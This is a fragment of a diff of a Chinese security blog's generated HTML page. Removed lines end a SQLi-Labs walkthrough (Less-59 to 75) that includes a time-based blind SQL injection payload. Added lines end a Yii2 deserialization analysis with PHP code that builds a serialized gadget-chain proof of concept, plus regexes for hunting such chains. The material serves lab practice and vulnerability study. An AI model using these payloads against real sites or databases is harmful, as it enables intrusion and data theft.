class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 
-</div><h2 id="0x3a-less-59"><a href="#0x3a-less-59" class="headerlink" title="0x3a less-59"></a>0x3a less-59</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">报错、布尔盲注、延时盲注</td>
-<td align="left"><code>id=$id</code></td>
-</tr>
-</tbody></table>
-<p>与 Less-58 的思路一样，只是拼接方式不一样</p>
-</div><h2 id="0x3b-less-60"><a href="#0x3b-less-60" class="headerlink" title="0x3b less-60"></a>0x3b less-60</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">报错、布尔盲注、延时盲注</td>
-<td align="left"><code>id=（&quot;$id&quot;）</code></td>
-</tr>
-</tbody></table>
-<p>与 Less-58 注入方式一致，只是拼接方式不一样</p>
-</div><h2 id="0x3c-less-61"><a href="#0x3c-less-61" class="headerlink" title="0x3c less-61"></a>0x3c less-61</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">报错、布尔盲注、延时盲注</td>
-<td align="left"><code>id=((&#39;$id&#39;))</code></td>
-</tr>
-</tbody></table>
-<p>与 Less-58 注入方式一致，只是拼接方式不一样</p>
-</div><h2 id="0x3d-less-62"><a href="#0x3d-less-62" class="headerlink" title="0x3d less-62"></a>0x3d less-62</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">布尔盲注、延时盲注</td>
-<td align="left"><code>id=(&#39;$id&#39;)</code></td>
-</tr>
-</tbody></table>
-<p>此时报错也取消了，这里只能进行布尔盲注或者延时盲注了</p>
-<p>Payload举例：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;)and IF(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=79,0,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
-</div><h2 id="0x3e-less-63"><a href="#0x3e-less-63" class="headerlink" title="0x3e less-63"></a>0x3e less-63</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">布尔盲注、延时盲注</td>
-<td align="left"><code>id=&#39;$id&#39;</code></td>
-</tr>
-</tbody></table>
-<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了</p>
-</div><h2 id="0x3f-less-64"><a href="#0x3f-less-64" class="headerlink" title="0x3f less-64"></a>0x3f less-64</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">布尔盲注、延时盲注</td>
-<td align="left"><code>id=(($id))</code></td>
-</tr>
-</tbody></table>
-<p>与 Less-62 注入方式一致，只是拼接方式不一样罢了</p>
-</div><h2 id="0x40-less-65"><a href="#0x40-less-65" class="headerlink" title="0x40 less-65"></a>0x40 less-65</h2><div class="story post-story"><table>
-<thead>
-<tr>
-<th align="left">请求方式</th>
-<th align="left">注入类型</th>
-<th align="left">拼接方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">GET</td>
-<td align="left">布尔盲注、延时盲注</td>
-<td align="left"><code>id=(&quot;$id&quot;)</code></td>
-</tr>
-</tbody></table>
-<p>与 Less-62 注入方式一致，只是拼接方式不一样</p>
-<hr>
-<p>SQLi-Labs显示的是共有Less75关，但源码只有Less65关</p>
-<p><img src="image/sqlilabs_Page-4.image/image-20210327175803080.png" class="lazyload" data-srcset="image/sqlilabs_Page-4.image/image-20210327175803080.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="less65"><br>Less66：GET - challenge - 盲注 - 允许3次查询 - 变种1</p>
-<p>Less67：GET - challenge - 盲注 - 允许3次查询 - 变种2</p>
-<p>Less68：GET - challenge - 盲注 - 允许3次查询 - 变种3</p>
-<p>Less69：GET - challenge - 盲注 - 允许3次查询 - 变种4</p>
-<p>Less70：POST - challenge - 错误 - 允许10次查询 - 变种1</p>
-<p>Less71：POST - challenge - 错误 - 允许10次查询 - 变种2</p>
-<p>Less72：POST - challenge - 错误 - 允许10次查询 - 变种3</p>
-<p>Less73：POST - challenge - 错误 - 允许10次查询 - 变种4</p>
-<p>Less74：POST - challenge - 盲注 - 允许3次查询 - 变种1</p>
-<p>Less75：POST - challenge - 盲注 - 允许3次查询 - 变种2</p>
-<hr>
-</div><h2 id="0x41-less-66"><a href="#0x41-less-66" class="headerlink" title="0x41 less-66"></a>0x41 less-66</h2><div class="story post-story"><h2 id="0x42-less-67"><a href="#0x42-less-67" class="headerlink" title="0x42 less-67"></a>0x42 less-67</h2><h2 id="0x43-less-68"><a href="#0x43-less-68" class="headerlink" title="0x43 less-68"></a>0x43 less-68</h2><h2 id="0x44-less-69"><a href="#0x44-less-69" class="headerlink" title="0x44 less-69"></a>0x44 less-69</h2><h2 id="0x45-less-70"><a href="#0x45-less-70" class="headerlink" title="0x45 less-70"></a>0x45 less-70</h2><h2 id="0x46-less-71"><a href="#0x46-less-71" class="headerlink" title="0x46 less-71"></a>0x46 less-71</h2><h2 id="0x47-less-72"><a href="#0x47-less-72" class="headerlink" title="0x47 less-72"></a>0x47 less-72</h2><h2 id="0x48-less-73"><a href="#0x48-less-73" class="headerlink" title="0x48 less-73"></a>0x48 less-73</h2><h2 id="0x49-less-74"><a href="#0x49-less-74" class="headerlink" title="0x49 less-74"></a>0x49 less-74</h2><h2 id="0x4a-less-75"><a href="#0x4a-less-75" class="headerlink" title="0x4a less-75"></a>0x4a less-75</h2>
-</div>
+<p>还有很多链，就不再复现了，下一次自己找自己写poc</p>
+<p><a target="_blank" rel="noopener" href="https://v0w.top/2020/09/22/Yii2unserialize/">https://v0w.top/2020/09/22/Yii2unserialize/</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/56">https://forum.butian.net/share/56</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/thresh/p/13743081.html">https://www.cnblogs.com/thresh/p/13743081.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9948">yii 2.0.42 最新反序列化利用全集 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.google.com/search?q=yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&ei=c-CCYPmDE5bk-gT-6YngAw&start=10&sa=N&ved=2ahUKEwi5id6q0JTwAhUWsp4KHf50AjwQ8NMDegQIARBN&biw=1351&bih=952">谷歌搜索</a></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://anquan.baidu.com/article/1260">https://anquan.baidu.com/article/1260</a></li>
+<li><a target="_blank" rel="noopener" href="https://0xkami.top/2020/10/26/0x08cve-2020-15148-Yii2">https://0xkami.top/2020/10/26/0x08cve-2020-15148-Yii2</a></li>
+</ul>
+<p><strong>正则匹配可控的方法</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;\$([a-zA-Z0-9_-]+)\(</span><br></pre></td></tr></table></figure>
+
+<p><strong>正则匹配可控的传入参数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^if ][^foreach ][^while ]\(\$([a-zA-Z0-9_-]+)-&gt;</span><br></pre></td></tr></table></figure>
+
   
   
     
@@ -2883,7 +2730,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
               
             
               
-                <p>本文永久链接是：<a href=http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-4/>http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-4/</a></p>
+                <p>本文永久链接是：<a href=http://scylamb.github.io/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/>http://scylamb.github.io/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a></p>
               
             
           </blockquote>
@@ -2900,10 +2747,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-14T09:36:44+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-09-02T11:05:23+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Apr 14, 2021</p>
+    <p>更新于：Sep 2, 2021</p>
   </a>
 </div>
 
@@ -2911,9 +2758,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         
           
-  
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/sqlilabs/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>sqlilabs</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>做题笔记</p></a></div>
-
 
         
       
@@ -2932,24 +2776,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   
 
-  
-    <div class="prev-next">
-      
-        <a class='prev' href='/uncategorized/hello-world/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Hello World</p>
-          <p class='content'>Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any ...</p>
-        </a>
-      
-      
-        <a class='next' href='/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/'>
-          <p class='title'>sqlilabs_Page-1<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>sqlilabs_Page-1Basic Injections（基本注入） 
-前言之前没坚持做完sqlilabs，这次来填坑
-参考：国光    sqlilabs注入天书
-注：大量复制原文，因为这...</p>
-        </a>
-      
-    </div>
   
   <!-- Custom Files postEnd begin-->
   
@@ -2993,6 +2819,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">搭建环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BatchQueryResult%E8%B5%B7%E7%82%B9"><span class="toc-text">BatchQueryResult起点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%9D%A1%E9%93%BERunProcess"><span class="toc-text">第二条链RunProcess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%9D%A1%E9%93%BESwift-KeyCache-DiskKeyCache"><span class="toc-text">第三条链Swift_KeyCache_DiskKeyCache</span></a></li></ol>
+    </div>
+  </section>
+
 
   
 
@@ -3009,8 +2849,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=true;
-  pdata.postTitle="sqlilabs_Page-4";
+  pdata.ispage=false;
+  pdata.postTitle="";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   //  see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs
@@ -3018,14 +2858,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.remove("show");
+    l_header.classList.add("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="half";
-      cover_wrapper.style.display="";
+      cover_wrapper.id="none";
+      cover_wrapper.style.display="none";
       scroll_down.style.display="none";
     
   
@@ -3485,19 +3325,19 @@ volantis.pjax.push(bindToggleButton);
     
       const sites_api = document.getElementById('sites-api');
       if (sites_api != undefined && typeof SitesJS === 'undefined') {
-        volantis.js("/js/plugins/sites.js?time=1629383072887")
+        volantis.js("/js/plugins/sites.js?time=1632838606449")
       }
     
     
       const friends_api = document.getElementById('friends-api');
       if (friends_api != undefined && typeof FriendsJS === 'undefined') {
-        volantis.js("/js/plugins/friends.js?time=1629383072887")
+        volantis.js("/js/plugins/friends.js?time=1632838606449")
       }
     
     
       const contributors_api = document.getElementById('contributors-api');
       if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
-        volantis.js("/js/plugins/contributors.js?time=1629383072887")
+        volantis.js("/js/plugins/contributors.js?time=1632838606449")
       }
     
   };
@@ -3597,7 +3437,7 @@ volantis.pjax.push(bindToggleButton);
       emojiMaps: emojiMaps,
     }))
   }
-  volantis.js('/js/valine.js?time=1629383072887').then(pjax_valine)
+  volantis.js('/js/valine.js?time=1632838606449').then(pjax_valine)
   volantis.pjax.push(pjax_valine);
 </script>
 
@@ -3606,7 +3446,7 @@ volantis.pjax.push(bindToggleButton);
 
 
 
-<script src="/js/app.js?time=1629383072887.js"></script>
+<script src="/js/app.js?time=1632838606449.js"></script>
 
 
 <!-- optional -->
@@ -3619,7 +3459,7 @@ volantis.pjax.push(bindToggleButton);
 
   function loadSearchScript() {
     // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
-    return volantis.js("/js/search/hexo.js?time=1629383072887");
+    return volantis.js("/js/search/hexo.js?time=1632838606449");
   }
 
   function loadSearchService() {
@@ -3887,8 +3727,8 @@ volantis.pjax.push(bindToggleButton);
   <script>
   volantis.message = (title, message, option = {}, done = null) => {
     if (typeof iziToast == "undefined") {
-      volantis.css('/css/message.css?time=1629383072887')
-      volantis.js('/js/message.js?time=1629383072887', () => {
+      volantis.css('/css/message.css?time=1632838606449')
+      volantis.js('/js/message.js?time=1632838606449', () => {
         tozashMessage(title, message, option, done);
       });
     } else {
@@ -3932,8 +3772,8 @@ volantis.pjax.push(bindToggleButton);
 
   volantis.question = (title, message, option = {}, success = null, cancel = null, done = null) => {
     if (typeof iziToast == "undefined") {
-      volantis.css('/css/message.css?time=1629383072887')
-      volantis.js('/js/message.js?time=1629383072887', () => {
+      volantis.css('/css/message.css?time=1632838606449')
+      volantis.js('/js/message.js?time=1632838606449', () => {
         tozashQuestion(title, message, option, success, cancel, done);
       });
     } else {
@@ -4094,7 +3934,7 @@ volantis.pjax.push(bindToggleButton);
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Scylamb's Blog","url":"http://scylamb.github.io/","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png"},"sameAs":["https://github.com/volantis-x"]},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://scylamb.github.io/","name":"Scylamb's Blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://scylamb.github.io/categories/ctf/","name":"ctf"}},{"@type":"ListItem","position":3,"item":{"@id":"http://scylamb.github.io/ctf/做题笔记/sqli-labs/sqlilabs_Page-4/","name":"sqlilabs_Page-4"}}]},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqlilabs_Page-4","description":"","datePublished":"2021-04-03T01:25:00.000Z","dateModified":"2021-04-14T01:36:44.646Z","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-4/"},"author":{"@type":"Person"},"publisher":{"@type":"Organization","name":"Scylamb's Blog","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-4/","wordCount":0,"articleSection":"ctf","keywords":"sqlilabs,做题笔记"}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Scylamb's Blog","url":"http://scylamb.github.io/","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png"},"sameAs":["https://github.com/volantis-x"]},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://scylamb.github.io/","name":"Scylamb's Blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://scylamb.github.io/Yii反序列化分析/","name":""}}]},{"@context":"http://schema.org","@type":"BlogPosting","headline":"","description":"","datePublished":"2021-09-28T14:10:04.555Z","dateModified":"2021-09-02T03:05:23.386Z","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://scylamb.github.io/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},"author":{"@type":"Person"},"publisher":{"@type":"Organization","name":"Scylamb's Blog","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://scylamb.github.io/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/","wordCount":0}]</script>
 
 
 <!-- more -->
